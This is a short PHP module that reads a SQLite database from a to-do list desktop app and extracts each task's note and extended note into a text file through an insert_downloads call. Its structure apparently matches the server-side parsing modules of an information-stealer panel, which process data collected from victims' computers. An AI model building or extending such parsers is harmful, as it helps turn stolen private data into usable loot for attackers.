<?php
class Module_tododesklist extends Module_
{
    private function ProcessTodo($Data)
    {
        $FileDB = GetTempFile('todo');
        if(!file_put_contents($FileDB, $Data))
            return FALSE;

        $db = new SQLite3($FileDB);
        if(!$db)
            return FALSE;

        $Data = $db->query('SELECT note, extended_note  FROM tasks');

		$Result = '';
        while($Element = $Data->fetchArray())
        {
            $Title = Assign_($Element['note']);
			$Result .= $Title . "\r\n";
			
            $Notes = Assign_($Element['extended_note']);
			$Result .= $Notes;
			
			$Result .= str_pad("", 30, "-") . "\r\n";
        }
		
		$this->insert_downloads(substr($Result, 0, 20) . ".txt", $Result);
			
        $db->close();
		$db = NULL;
        @unlink($FileDB);
    }

    public function process_module($Data, $Version)
    {
		if(!class_exists("SQLite3"))
			return;
        switch ($Version)
        {
        case 0:
            $this->ProcessTodo($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
